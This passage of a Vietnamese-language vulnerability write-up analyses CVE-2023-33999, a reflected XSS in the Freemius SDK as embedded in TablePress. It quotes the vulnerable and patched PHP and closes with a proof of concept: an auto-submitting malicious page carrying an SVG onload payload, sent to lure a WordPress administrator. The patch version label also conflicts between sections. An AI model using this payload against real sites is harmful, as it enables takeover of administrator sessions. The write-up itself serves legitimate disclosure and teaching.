&lt;strong&gt;upsell / upgrade&lt;/strong&gt; trong dashboard WordPress&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;div class=&#34;alert alert-note&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M0 8a8 8 0 1116 0A8 8 0 010 8zm8-6.5a6.5 6.5.0 100 13 6.5 6.5.0 000-13zM6.5 7.75A.75.75.0 017.25 7h1a.75.75.0 01.75.75v2.75h.25a.75.75.0 010 1.5h-2a.75.75.0 010-1.5h.25v-2h-.25a.75.75.0 01-.75-.75zM8 6a1 1 0 110-2 1 1 0 010 2z&#34;/&gt;&lt;/svg&gt;Ghi chú&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Freemius SDK&lt;/strong&gt; không phải là một plugin riêng biệt mà được nhúng trực tiếp vào mã nguồn của các plugin hoặc theme khác. Vì vậy, khi xảy ra lỗ hổng trong &lt;strong&gt;Freemius SDK&lt;/strong&gt;, rất nhiều sản phẩm cũng sẽ bị ảnh hưởng theo. Plugin &lt;a href=&#34;https://wordpress.org/plugins/tablepress/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;TablePress&lt;/strong&gt;&lt;/a&gt; là một trong những trường hợp bị tác động, nên tôi chọn nó để phân tích.&lt;/p&gt;&lt;/div&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Trong phiên bản lỗi v2.5.9:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;/**&#xA; * A helper method to fetch GET/POST user input with an optional default value when the input is not set.&#xA; * @author Vova Feldman (@svovaf)&#xA; *&#xA; * @param string      $key&#xA; * @param mixed       $def&#xA; * @param string|bool $type Since 1.2.1.7 - when set to &amp;#39;get&amp;#39; will look for the value passed via querystring, when&#xA; *                          set to &amp;#39;post&amp;#39; will look for the value passed via the POST request&amp;#39;s body, otherwise,&#xA; *                          will check if the parameter was passed in any of the two.&#xA; *&#xA; * @return mixed&#xA; */&#xA;function fs_request_get( $key, $def = false, $type = false ) {&#xA;    if ( is_string( $type ) ) {&#xA;        $type = strtolower( $type );&#xA;    }&#xA;&#xA;    /**&#xA;     * Note to WordPress.org Reviewers:&#xA;     *  This is a helper method to fetch GET/POST user input with an optional default value when the input is not set. The actual sanitization is done in the scope of the function&amp;#39;s usage.&#xA;     */&#xA;    switch ( $type ) {&#xA;        case &amp;#39;post&amp;#39;:&#xA;            $value = isset( $_POST[ $key ] ) ? $_POST[ $key ] : $def;&#xA;            break;&#xA;        case &amp;#39;get&amp;#39;:&#xA;            $value = isset( $_GET[ $key ] ) ? $_GET[ $key ] : $def;&#xA;            break;&#xA;        default:&#xA;            $value = isset( $_REQUEST[ $key ] ) ? $_REQUEST[ $key ] : $def;&#xA;            break;&#xA;    }&#xA;&#xA;    return $value;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm &lt;code&gt;fs_request_get()&lt;/code&gt; dùng để &lt;strong&gt;lấy giá trị của một tham số từ request của người dùng&lt;/strong&gt; (GET, POST hoặc cả hai), dựa trên tên key được truyền vào. Nếu tham số không tồn tại, hàm sẽ trả về giá trị mặc định. Tham số &lt;code&gt;$type&lt;/code&gt; cho phép chỉ định rõ nguồn dữ liệu là từ &lt;code&gt;GET&lt;/code&gt;, &lt;code&gt;POST&lt;/code&gt; hoặc tất cả (&lt;code&gt;REQUEST&lt;/code&gt;).&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition bug open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Lỗi&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;Dữ liệu trả về không được làm sạch (sanitize) hoặc thoát ký tự (escape). Nếu giá trị này được in ra trình duyệt (ví dụ bằng &lt;code&gt;echo&lt;/code&gt;) mà không xử lý an toàn, kẻ tấn công có thể chèn mã JavaScript độc hại thông qua tham số request, từ đó dẫn đến lỗ hổng &lt;strong&gt;Reflected Cross-Site Scripting (XSS)&lt;/strong&gt;.&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Bản vá v2.5.9:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function fs_request_get_raw( $key, $def = false, $type = false ) {&#xA;    if ( is_string( $type ) ) {&#xA;        $type = strtolower( $type );&#xA;    }&#xA;&#xA;    /**&#xA;     * Note to WordPress.org reviewers:&#xA;     * This is a helper function to fetch GET/POST user input with an optional default value when the input is not set. The actual sanitization is done in the scope of the function&amp;#39;s usage.&#xA;     */&#xA;    switch ( $type ) {&#xA;        case &amp;#39;post&amp;#39;:&#xA;            // phpcs:ignore WordPress.Security.NonceVerification.Missing&#xA;            $value = isset( $_POST[ $key ] ) ? $_POST[ $key ] : $def;&#xA;            break;&#xA;        case &amp;#39;get&amp;#39;:&#xA;            // phpcs:ignore WordPress.Security.NonceVerification.Recommended&#xA;            $value = isset( $_GET[ $key ] ) ? $_GET[ $key ] : $def;&#xA;            break;&#xA;        default:&#xA;            // phpcs:ignore WordPress.Security.NonceVerification.Recommended&#xA;            $value = isset( $_REQUEST[ $key ] ) ? $_REQUEST[ $key ] : $def;&#xA;            break;&#xA;    }&#xA;&#xA;    // Don&amp;#39;t unslash if the value itself is empty (empty string, null, empty array etc).&#xA;    return empty( $value ) ? $value : wp_unslash( $value );&#xA;}&#xA;&#xA;function fs_sanitize_input( $input ) {&#xA;    if ( is_array( $input ) ) {&#xA;        foreach ( $input as $key =&amp;gt; $value ) {&#xA;            $input[ $key ] = fs_sanitize_input( $value );&#xA;        }&#xA;    } else {&#xA;        // Allow empty values to pass through as-is, like `null`, `&amp;#39;&amp;#39;`, `0`, `&amp;#39;0&amp;#39;` etc.&#xA;        $input = empty( $input ) ? $input : sanitize_text_field( $input );&#xA;    }&#xA;&#xA;    return $input;&#xA;}&#xA;&#xA;function fs_request_get( $key, $def = false, $type = false ) {&#xA;    return fs_sanitize_input( fs_request_get_raw( $key, $def, $type ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Bản vá đã tách việc &lt;strong&gt;lấy dữ liệu&lt;/strong&gt; và &lt;strong&gt;làm sạch dữ liệu&lt;/strong&gt; thành hai bước riêng biệt.&#xA;&lt;code&gt;fs_request_get_raw()&lt;/code&gt; chỉ lấy giá trị thô từ GET/POST/REQUEST và bỏ escape bằng &lt;code&gt;wp_unslash()&lt;/code&gt;, trong khi &lt;code&gt;fs_sanitize_input()&lt;/code&gt; đảm nhiệm việc làm sạch (kể cả khi dữ liệu là mảng) bằng &lt;code&gt;sanitize_text_field()&lt;/code&gt;. Cuối cùng, &lt;code&gt;fs_request_get()&lt;/code&gt; luôn trả về dữ liệu đã được làm sạch. Nhờ đó, dữ liệu độc hại không còn được trả ra trực tiếp, giúp giảm nguy cơ khai thác &lt;strong&gt;Reflected XSS&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Hàm &lt;code&gt;fs_request_get()&lt;/code&gt; được gọi ở rất nhiều nơi&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-05-cve-2023-33999/call.png&#34; title=&#34;127 references&#34; data-thumbnail=&#34;/posts/2025-12-05-cve-2023-33999/call.png&#34; data-sub-html=&#34;&lt;h2&gt;Call&lt;/h2&gt;&lt;p&gt;127 references&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-05-cve-2023-33999/call.png&#39; alt=&#34;Call&#34; height=&#34;165&#34; width=&#34;702&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;127 references&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;nên quá trình &lt;code&gt;trace&lt;/code&gt; hơi tối thời gian&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-05-cve-2023-33999/search.png&#34; title=&#34;Vị trí gọi fs_request_get&#34; data-thumbnail=&#34;/posts/2025-12-05-cve-2023-33999/search.png&#34; data-sub-html=&#34;&lt;h2&gt;Search&lt;/h2&gt;&lt;p&gt;Vị trí gọi fs_request_get&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-05-cve-2023-33999/search.png&#39; alt=&#34;Search&#34; height=&#34;663&#34; width=&#34;1616&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Vị trí gọi fs_request_get&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Hàm &lt;code&gt;dynamic_init()&lt;/code&gt; gọi đến &lt;code&gt;fs_request_get()&lt;/code&gt; để lấy giá trị của các key như &lt;code&gt;purchased_plan&lt;/code&gt; và &lt;code&gt;purchase_email&lt;/code&gt; từ request, sau đó sử dụng các giá trị này để hiển thị nội dung thông báo xác nhận mua license trong trang quản trị. Các giá trị này không được làm sạch trước khi được đưa vào nội dung hiển thị, dẫn đến nguy cơ dữ liệu do người dùng kiểm soát có thể chèn mã độc và gây ra lỗ hổng &lt;strong&gt;Reflected Cross-Site Scripting (XSS)&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Để thông báo này xảy ra, cần phải đáp ứng 3 điều kiện:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Request phải được gọi từ Admin Dashboard&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$this-&amp;gt;is_user_in_admin()&#xA;/**&#xA; * Check if a real user is visiting the admin dashboard.&#xA; *&#xA; * @author Vova Feldman (@svovaf)&#xA; * @since  1.1.7&#xA; *&#xA; * @return bool&#xA; */&#xA;function is_user_in_admin() {&#xA;    return (&#xA;        is_admin() &amp;amp;&amp;amp;&#xA;        ! self::is_ajax() &amp;amp;&amp;amp;&#xA;        ! self::is_cron() &amp;amp;&amp;amp;&#xA;        ! self::is_admin_post()&#xA;    );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Kiểm tra người dùng đã từng kết nối (opt-in) với Freemius hay chưa.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$this-&amp;gt;is_registered()&#xA;/**&#xA; * Check if user has connected his account (opted-in).&#xA; *&#xA; * Note:&#xA; *      If the user opted-in and opted-out on a later stage,&#xA; *      this will still return true. If you want to check if the&#xA; *      user is currently opted-in, use:&#xA; *          `$fs-&amp;gt;is_registered() &amp;amp;&amp;amp; $fs-&amp;gt;is_tracking_allowed()`&#xA; *&#xA; * @author Vova Feldman (@svovaf)&#xA; * @since  1.0.1&#xA; *&#xA; * @param bool $ignore_anonymous_state Since 2.5.1&#xA; *&#xA; * @return bool&#xA; */&#xA;function is_registered( $ignore_anonymous_state = false ) {&#xA;    return (&#xA;        is_object( value: $this-&amp;gt;_user ) &amp;amp;&amp;amp;&#xA;        (&#xA;            $this-&amp;gt;is_premium() ||&#xA;            $ignore_anonymous_state ||&#xA;            ! $this-&amp;gt;is_anonymous()&#xA;        )&#xA;    );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Sau khi thiết lập plugin thành công, hệ thống sẽ gửi một email xác nhận để hoàn tất quá trình kết nối (opt-in) này.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-05-cve-2023-33999/opt_in.png&#34; title=&#34;Kết nối với Freemius&#34; data-thumbnail=&#34;/posts/2025-12-05-cve-2023-33999/opt_in.png&#34; data-sub-html=&#34;&lt;h2&gt;Opt In&lt;/h2&gt;&lt;p&gt;Kết nối với Freemius&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-05-cve-2023-33999/opt_in.png&#39; alt=&#34;Opt In&#34; height=&#34;238&#34; width=&#34;1380&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Kết nối với Freemius&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Request phải chứa param &lt;code&gt;purchase_completed&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;fs_request_has( &amp;#39;purchase_completed&amp;#39; )&#xA;function fs_request_has( $key ) {&#xA;    return isset( $_REQUEST[ $key ] );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;&#xA;&lt;p&gt;&lt;code&gt;dynamic_init()&lt;/code&gt; được gọi trong hàm &lt;code&gt;fs_dynamic_init()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function fs_dynamic_init( $module ) {&#xA;    $fs = Freemius::instance( $module[&amp;#39;id&amp;#39;], $module[&amp;#39;slug&amp;#39;], true );&#xA;    $fs-&amp;gt;dynamic_init( $module );&#xA;&#xA;    return $fs;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm này tạo một instance của &lt;code&gt;Freemius&lt;/code&gt; và gọi &lt;code&gt;dynamic_init()&lt;/code&gt; để khởi tạo SDK với cấu hình từ &lt;code&gt;$module&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;fs_dynamic_init()&lt;/code&gt; được gọi trong file &lt;code&gt;tablepress/tablepress.php&lt;/code&gt; (&lt;code&gt;hàm tb_tp_fs()&lt;/code&gt;)&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function tb_tp_fs() {&#xA;    global $tb_tp_fs;&#xA;&#xA;    if ( ! isset( $tb_tp_fs ) ) {&#xA;        // Include Freemius SDK.&#xA;        require_once __DIR__ . &amp;#39;/libraries/freemius/start.php&amp;#39;;&#xA;&#xA;        $tb_tp_fs = fs_dynamic_init( array(&#xA;            &amp;#39;id&amp;#39;                =&amp;gt; &amp;#39;10340&amp;#39;,&#xA;            &amp;#39;slug&amp;#39;              =&amp;gt; &amp;#39;tablepress&amp;#39;,&#xA;            &amp;#39;type&amp;#39;              =&amp;gt; &amp;#39;plugin&amp;#39;,&#xA;            &amp;#39;public_key&amp;#39;        =&amp;gt; &amp;#39;pk_b215ca1bb4041cf43ed137ae7665b&amp;#39;,&#xA;            &amp;#39;is_premium&amp;#39;        =&amp;gt; false,&#xA;            &amp;#39;has_addons&amp;#39;        =&amp;gt; false,&#xA;            &amp;#39;has_paid_plans&amp;#39;    =&amp;gt; true,&#xA;            &amp;#39;menu&amp;#39;              =&amp;gt; array(&#xA;                &amp;#39;slug&amp;#39;    =&amp;gt; &amp;#39;tablepress&amp;#39;,&#xA;                &amp;#39;contact&amp;#39; =&amp;gt; false,&#xA;                &amp;#39;support&amp;#39; =&amp;gt; false,&#xA;                &amp;#39;account&amp;#39; =&amp;gt; false,&#xA;                &amp;#39;pricing&amp;#39; =&amp;gt; false,&#xA;            ),&#xA;            &amp;#39;opt_in_moderation&amp;#39; =&amp;gt; array(&#xA;                &amp;#39;new&amp;#39;       =&amp;gt; true,&#xA;                &amp;#39;updates&amp;#39;   =&amp;gt; false,&#xA;                &amp;#39;localhost&amp;#39; =&amp;gt; false,&#xA;            ),&#xA;            &amp;#39;is_live&amp;#39;           =&amp;gt; true,&#xA;        ) );&#xA;    }&#xA;&#xA;    return $tb_tp_fs;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm này:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Nạp Freemius SDK&lt;/li&gt;&#xA;&lt;li&gt;Gọi &lt;code&gt;fs_dynamic_init()&lt;/code&gt; với cấu hình dành riêng cho TablePress&lt;/li&gt;&#xA;&lt;li&gt;Lưu instance vào biến global &lt;code&gt;$tb_tp_fs&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;code&gt;tb_tp_fs()&lt;/code&gt; được gọi ngay trong &lt;code&gt;tablepress/tablepress.php&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;// Init Freemius.&#xA;tb_tp_fs();&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Vì &lt;code&gt;tablepress.php&lt;/code&gt; là file được WordPress load đầu tiên khi plugin chạy, nên Freemius SDK cũng được khởi tạo ngay từ đây.&lt;/p&gt;&#xA;&lt;p&gt;Do đó, luồng &lt;code&gt;tablepress/tablepress.php&lt;/code&gt; → &lt;code&gt;tb_tp_fs()&lt;/code&gt; → &lt;code&gt;fs_dynamic_init()&lt;/code&gt; → &lt;code&gt;dynamic_init()&lt;/code&gt; luôn được thực thi mỗi khi WordPress xử lý một request và plugin TablePress được load. Điều này đồng nghĩa với việc các logic nằm trong &lt;code&gt;dynamic_init()&lt;/code&gt;, bao gồm việc đọc dữ liệu từ request (như &lt;code&gt;purchased_plan&lt;/code&gt;, &lt;code&gt;purchase_email…&lt;/code&gt;), sẽ luôn có cơ hội được kích hoạt khi người dùng truy cập vào các endpoint liên quan đến khu vực quản trị.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-05-cve-2023-33999/trigger.png&#34; title=&#34;Kích hoạt lỗ hổng&#34; data-thumbnail=&#34;/posts/2025-12-05-cve-2023-33999/trigger.png&#34; data-sub-html=&#34;&lt;h2&gt;Trigger&lt;/h2&gt;&lt;p&gt;Kích hoạt lỗ hổng&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-05-cve-2023-33999/trigger.png&#39; alt=&#34;Trigger&#34; height=&#34;1056&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Kích hoạt lỗ hổng&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Tuy nhiên, để lỗ hổng có thể bị lợi dụng với đặc quyền Unauthenticated, kẻ tấn công không thể tự tác động trực tiếp mà phải xây dựng một kịch bản gián tiếp, chẳng hạn bằng cách dụ quản trị viên truy cập vào một website độc hại (malicious website). Khi đó, trình duyệt của admin có thể vô tình gửi request tới trang quản trị WordPress đang đăng nhập, mang theo các tham số do kẻ tấn công kiểm soát, từ đó kích hoạt hành vi không mong muốn trong quá trình xử lý của plugin.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;poc&#34;&gt;&lt;span&gt;PoC&lt;/span&gt;&#xA;  &lt;a href=&#34;#poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Tạo một website độc hại có nhiệm vụ tự động gửi request tới trang quản trị WordPress:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;html&amp;gt;&#xA;  &amp;lt;body&amp;gt;&#xA;    &amp;lt;form action=&amp;#34;http://localhost/wp-admin/index.php&amp;#34;&amp;gt;&#xA;      &amp;lt;input type=&amp;#34;hidden&amp;#34; name=&amp;#34;purchase&amp;amp;#95;email&amp;#34; value=&amp;#34;&amp;amp;lt;svg&amp;amp;#47;onload&amp;amp;#61;alert&amp;amp;#40;&amp;amp;#41;&amp;amp;gt;&amp;#34; /&amp;gt;&#xA;      &amp;lt;input type=&amp;#34;submit&amp;#34; value=&amp;#34;Submit request&amp;#34; /&amp;gt;&#xA;    &amp;lt;/form&amp;gt;&#xA;    &amp;lt;script&amp;gt;&#xA;      history.pushState(&amp;#39;&amp;#39;, &amp;#39;&amp;#39;, &amp;#39;/&amp;#39;);&#xA;      document.forms[0].submit();&#xA;    &amp;lt;/script&amp;gt;&#xA;  &amp;lt;/body&amp;gt;&#xA;&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Gửi đường link của website này cho người dùng có quyền quản trị và dụ họ truy cập, từ đó kích hoạt request được gửi đi khi trang độc hại được tải.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;CVE-2023-33999 xuất phát từ việc &lt;strong&gt;không làm sạch dữ liệu đầu vào&lt;/strong&gt; trong &lt;code&gt;fs_request_get()&lt;/code&gt; của Freemius SDK, cho phép dữ liệu do người dùng kiểm soát được đưa thẳng vào nội dung hiển thị trong trang quản trị. Vì Freemius được nhúng rộng rãi trong rất nhiều plugin và theme, phạm vi ảnh hưởng của lỗ hổng này lớn hơn rất nhiều so với một plugin đơn lẻ. Bản vá 2.5.10 đã khắc phục triệt để bằng cách &lt;strong&gt;tách riêng bước lấy dữ liệu và bước làm sạch&lt;/strong&gt;, đảm bảo mọi dữ liệu từ request đều được sanitize trước khi sử dụng.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Không bao giờ tin tưởng dữ liệu từ &lt;code&gt;$_GET&lt;/code&gt;, &lt;code&gt;$_POST&lt;/code&gt;, &lt;code&gt;$_REQUEST&lt;/code&gt; – luôn &lt;strong&gt;sanitize và escape&lt;/strong&gt; trước khi sử dụng hoặc hiển thị.&lt;/li&gt;&#xA;&lt;li&gt;Một SDK dùng chung (như Freemius) khi có lỗ hổng sẽ tạo &lt;strong&gt;tác động dây chuyền&lt;/strong&gt; lên hàng nghìn sản phẩm.&lt;/li&gt;&#xA;&lt;li&gt;Luôn kiểm tra các thư viện bên thứ ba và &lt;strong&gt;cập nhật phiên bản vá lỗi kịp thời&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Việc khởi tạo SDK sớm (early init) khiến lỗ hổng có thể bị kích hoạt trên nhiều request hơn dự kiến.&lt;/li&gt;&#xA;&lt;li&gt;Reflected XSS có thể được khai thác gián tiếp thông qua &lt;strong&gt;social engineering&lt;/strong&gt; và các website độc hại.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; 